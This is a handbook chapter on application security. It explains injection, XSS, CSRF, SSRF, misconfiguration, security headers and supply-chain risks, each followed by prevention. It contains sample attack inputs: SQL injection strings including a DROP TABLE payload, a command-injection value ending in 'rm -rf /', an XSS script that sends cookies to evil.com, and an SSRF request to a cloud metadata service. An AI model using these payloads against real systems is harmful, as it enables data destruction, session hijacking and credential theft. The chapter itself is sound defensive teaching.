# 05 — Application Security

> **09-Security Series** — Engineering Handbook
> Language-agnostic · 8–10 min read

---

## 1. What Is Application Security?

Application security is the practice of building software that resists attacks targeting the application layer — the business logic, the APIs, the user interfaces. Unlike network or transport security, which protects the channel, application security protects against attacks that use the channel correctly but abuse the application's logic or trust assumptions.

The Open Web Application Security Project (**OWASP**) publishes the Top 10 — the most critical web application security risks, updated regularly based on real-world vulnerability data. Every engineer should know these.

> **The most important mindset for application security:** never trust user input. Every piece of data that enters your system from outside — HTTP parameters, headers, request bodies, uploaded files, even data from other services — must be treated as potentially hostile until validated.

---

## 2. Injection Attacks — #1 Threat

Injection attacks occur when an attacker sends malicious data that is interpreted as a command by a backend system. The application fails to distinguish between data and instructions.

### SQL Injection

```
Vulnerable code:
  query = "SELECT * FROM users WHERE username = '" + username + "'"

Attacker input: username = "admin' OR '1'='1"

Resulting query:
  SELECT * FROM users WHERE username = 'admin' OR '1'='1'
  → Returns ALL users (OR '1'='1' is always true)
  → Attacker bypasses authentication

Worse input: username = "'; DROP TABLE users; --"
  SELECT * FROM users WHERE username = ''; DROP TABLE users; --'
  → Deletes the entire users table
```

**Prevention — parameterised queries:**

```
Vulnerable (string concatenation):
  "SELECT * FROM users WHERE id = " + userId

Safe (parameterised):
  "SELECT * FROM users WHERE id = ?"  with parameter [userId]

The database treats the parameter as DATA, never as SQL commands.
No matter what userId contains, it cannot alter the query structure.
```

**Also use:**
- Input validation (reject unexpected characters where appropriate)
- Principle of least privilege (DB user has only the permissions it needs)
- Web Application Firewall (WAF) as an additional layer

### Command Injection

When user input is passed to a system shell command:

```
Vulnerable: system("ping " + hostname)
Attack:     hostname = "google.com; rm -rf /"

Safe: Use library functions that don't invoke a shell;
      validate input strictly; never pass user input to shell commands
```

### Other Injection Types

| Type | Where | Prevention |
|---|---|---|
| **LDAP injection** | Directory services | Parameterised LDAP queries |
| **XML/XXE injection** | XML parsers | Disable external entity processing |
| **Template injection** | Server-side template engines | Never render user input as a template |
| **Path traversal** | File system operations | Validate and sanitise file paths; use allowlists |

---

## 3. Cross-Site Scripting (XSS)

XSS occurs when an attacker injects malicious scripts into web pages viewed by other users. The browser executes the script in the context of the victim's session.

```
Stored XSS (persisted in database):
  Attacker submits a comment:
    "Great article! <script>document.location='https://evil.com?c='+document.cookie</script>"
  
  Server stores this in the DB.
  
  Victim visits the page → browser renders the comment → executes the script
  → Victim's session cookie sent to attacker's server
  → Attacker uses cookie to hijack victim's session
```

**Three types:**

| Type | Source of malicious input | Persistence |
|---|---|---|
| **Stored (Persistent)** | Stored in DB, file, or elsewhere | Permanent until removed |
| **Reflected** | In URL parameter, reflected in response | Single request |
| **DOM-based** | Client-side JavaScript processes attacker-controlled input | No server involvement |

**Prevention:**

```
1. Output encoding (most important):
   Never insert user-supplied data into HTML without encoding it.
   "<script>" becomes "&lt;script&gt;" → browser displays text, doesn't execute

2. Content Security Policy (CSP) header:
   Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'
   → Browser refuses to execute inline scripts or scripts from untrusted sources
   → Even if attacker injects a script tag, CSP blocks execution

3. HttpOnly cookies:
   Session cookies not accessible to JavaScript
   → XSS cannot steal session cookies

4. Input validation:
   Reject or sanitise HTML from user input where it's not needed
```

---

## 4. Cross-Site Request Forgery (CSRF)

CSRF tricks an authenticated user's browser into sending a request to your application without the user's knowledge.

```
Victim is logged into bank.com (has a valid session cookie)

Attacker sends victim a link to evil.com, which contains:
  <img src="https://bank.com/transfer?to=attacker&amount=10000">

Victim visits evil.com
→ Browser loads the image
→ Browser sends GET to bank.com — INCLUDING the victim's session cookie (automatic)
→ bank.com sees a valid authenticated request to transfer £10,000
→ Transfer processed
```

**Prevention:**

```
1. CSRF tokens (most reliable):
   Server generates a random token per session/request
   Token embedded in every form and AJAX request
   Server validates token on every state-changing request

   <form action="/transfer" method="POST">
     <input type="hidden" name="csrf_token" value="random-unguessable-token">
   </form>

   Attacker cannot forge a request because they don't know the CSRF token
   (they can trigger the request, but can't include the correct token)

2. SameSite cookie attribute:
   Set-Cookie: session=abc123; SameSite=Strict
   → Browser refuses to send cookie on cross-site requests
   → Fully prevents CSRF with no token needed

3. Verify Origin/Referer header:
   Reject requests where Origin or Referer doesn't match your domain
   (less reliable; some browsers don't send these headers)
```

---

## 5. Insecure Direct Object Reference (IDOR)

Covered in depth in the Authorisation file (03). Key summary:

```
Attack: User changes a resource ID in a request to access another user's resource

Prevention:
  1. Check ownership on every resource request (server-side)
  2. Use non-sequential UUIDs for resource IDs
  3. Never trust client-provided ownership claims
```

---

## 6. Security Misconfiguration

Security misconfiguration is using insecure default settings or leaving unnecessary features enabled. It's #5 on OWASP Top 10 and extremely common because most frameworks default to "convenient" rather than "secure."

```
Common misconfigurations:

❌ Default credentials unchanged (admin/admin on database, admin panel)
❌ Stack traces / debug info exposed to users in production
❌ Directory listing enabled on web server (reveals file structure)
❌ Unused services/ports open (increased attack surface)
❌ S3 bucket publicly readable (mass data exposures happen this way constantly)
❌ Verbose error messages revealing database queries, file paths, software versions
❌ CORS configured as "*" (allows any origin to make credentialed requests)
❌ Development/debug endpoints accessible in production
```

**Prevention framework:**

```
Security hardening checklist for every deployment:
  → Remove all default credentials; generate strong random passwords
  → Disable all features not in use
  → Suppress detailed error messages in production; log details server-side
  → Audit cloud storage permissions (no public buckets unless intentional)
  → Configure CORS with an explicit allowlist of origins
  → Remove debug and admin endpoints from production builds
  → Run automated security scanners against infrastructure
```

---

## 7. Server-Side Request Forgery (SSRF)

SSRF tricks the server into making HTTP requests to an unintended location — often to internal services not accessible from the internet.

```
Feature: "Enter a URL and we'll display a preview of the webpage"

Legitimate use: https://example.com → server fetches and displays
Attack:         http://169.254.169.254/latest/meta-data/  (AWS metadata service)

Result:
  Server makes request to internal AWS metadata service
  Returns: AWS credentials, instance role, networking config
  Attacker now has AWS credentials → can access S3, EC2, etc.

Other targets:
  http://localhost:8080/admin  (internal admin panel)
  http://10.0.0.1/internal-api  (internal network services)
  http://redis:6379  (direct protocol access to internal services)
```

**Prevention:**

```
1. Validate URLs against an allowlist of permitted domains
2. Block requests to private IP ranges (10.x.x.x, 172.16.x.x, 192.168.x.x, 169.254.x.x)
3. Use a dedicated egress proxy for all outbound requests (with allowlisting)
4. Disable unnecessary URL schemes (file://, gopher://, ftp://)
5. On cloud providers: disable metadata service or require IMDSv2 (requires token)
```

---

## 8. Security Headers

HTTP response headers can instruct browsers to enforce security policies. They are cheap to implement and significantly reduce attack surface.

| Header | Purpose | Example Value |
|---|---|---|
| **Content-Security-Policy** | Restricts sources of scripts, styles, images | `default-src 'self'; script-src 'self' 'nonce-abc'` |
| **Strict-Transport-Security** | Enforce HTTPS; prevent downgrade | `max-age=31536000; includeSubDomains` |
| **X-Content-Type-Options** | Prevent MIME sniffing | `nosniff` |
| **X-Frame-Options** | Prevent clickjacking via iframes | `DENY` or `SAMEORIGIN` |
| **Referrer-Policy** | Control what's in the Referer header | `strict-origin-when-cross-origin` |
| **Permissions-Policy** | Restrict browser APIs (camera, microphone) | `camera=(), microphone=()` |

**Clickjacking** — mitigated by X-Frame-Options:

```
Attack: Attacker embeds your site in an invisible iframe over a fake page
        User thinks they're clicking on attacker's content
        Actually clicking on your site's buttons (e.g., "confirm transfer")

Prevention: X-Frame-Options: DENY
  → Browser refuses to render your page inside any iframe
```

---

## 9. Dependency and Supply Chain Security

Modern applications use hundreds of third-party libraries. Each is a potential vulnerability.

```
Your application depends on:
  library A → depends on library B → depends on library C

Library C has a known vulnerability.
Your application is vulnerable even though YOU wrote secure code.
```

**Supply chain attacks** are increasingly common — attackers compromise popular packages in npm, PyPI, or Maven to inject malicious code that executes when anyone installs the package.

**Mitigations:**

```
Dependency scanning:
  Automatically scan dependencies for known CVEs (Snyk, Dependabot, OWASP Dependency-Check)
  Run in CI/CD — fail builds on high-severity vulnerabilities

Dependency pinning:
  Lock exact versions; review and approve every update
  Reduces risk of accidental version bumps pulling in vulnerable code

Minimal dependencies:
  Every dependency is an attack surface; prefer fewer, well-maintained libraries

Software Bill of Materials (SBOM):
  Generate a list of all dependencies and versions for each release
  Required by many regulatory frameworks

Integrity verification:
  Verify package checksums on install
  Use package registries with signature verification
```

---

## 10. How Large Companies Apply This

| Company | Practice | Source |
|---|---|---|
| **Google** | Sanitises all user-supplied data before rendering; ships with CSP headers | Google security documentation |
| **GitHub** | Dependabot automatically detects and PRs dependency vulnerabilities | GitHub public features |
| **Netflix** | Automated static analysis in CI/CD pipeline for every commit | Netflix Tech Blog (public) |
| **Facebook** | XSS Auditor; custom HTML sanitisation library | Facebook Eng Blog (public) |

---

## 11. Best Practices

- **Always use parameterised queries** — no exceptions for SQL or any other injection-prone context.
- **Encode output for the context** — HTML encoding for HTML, URL encoding for URLs, etc.
- **Implement CSP headers** — reduces XSS impact dramatically even if injection occurs.
- **Use SameSite=Strict on all session cookies** — eliminates CSRF without token management.
- **Validate all URLs passed to the server** — prevents SSRF against internal services.
- **Run automated dependency scanning** in every CI/CD pipeline.
- **Harden every deployment** — remove defaults, suppress debug output, audit permissions.

---

## 12. Common Mistakes

| Mistake | Consequence | Fix |
|---|---|---|
| String concatenation in SQL queries | SQL injection; data breach or deletion | Parameterised queries always |
| Rendering user input as HTML without encoding | XSS; session hijacking | Output encoding for context |
| No SameSite cookie attribute | CSRF attacks possible | SameSite=Strict on session cookies |
| Trusting URLs from user input | SSRF; internal network access | Allowlist validation + block private ranges |
| Verbose error messages in production | Reveals system internals to attackers | Generic errors externally; details in server logs |
| No dependency scanning | Known vulnerabilities in dependencies | Automated scanning in CI/CD |

---

## 13. Interview Questions

1. What is SQL injection and how do parameterised queries prevent it?
2. Explain the difference between stored XSS and reflected XSS.
3. What is CSRF? How does the SameSite cookie attribute prevent it?
4. What is SSRF and what internal resources can an attacker reach through it?
5. What is a Content Security Policy and what does it protect against?
6. What is a supply chain attack? How do you defend against it?
7. Name three common security misconfigurations and how to fix them.

---

## 14. Summary

| Attack | Mechanism | Primary Defence |
|---|---|---|
| **SQL Injection** | User input alters SQL structure | Parameterised queries |
| **XSS** | Injected script runs in victim's browser | Output encoding + CSP |
| **CSRF** | Forged cross-site request using victim's session | SameSite=Strict cookie |
| **IDOR** | Manipulated resource IDs access other users' data | Ownership check on every request |
| **Security Misconfiguration** | Insecure defaults left in place | Hardening checklist per deployment |
| **SSRF** | Server fetches attacker-specified internal URL | URL allowlisting + block private ranges |
| **Supply Chain** | Malicious code in dependencies | Dependency scanning + pinning |

---

## 15. Cross References

**Prerequisites:** 01-security-fundamentals.md · 03-authorisation.md

**Related Topics:** 07-api-security.md · 04-transport-security.md · Security (NFR #7)

**What to Learn Next:** 06-secrets-and-key-management.md

---

*System Design Engineering Handbook — 09-Security Series*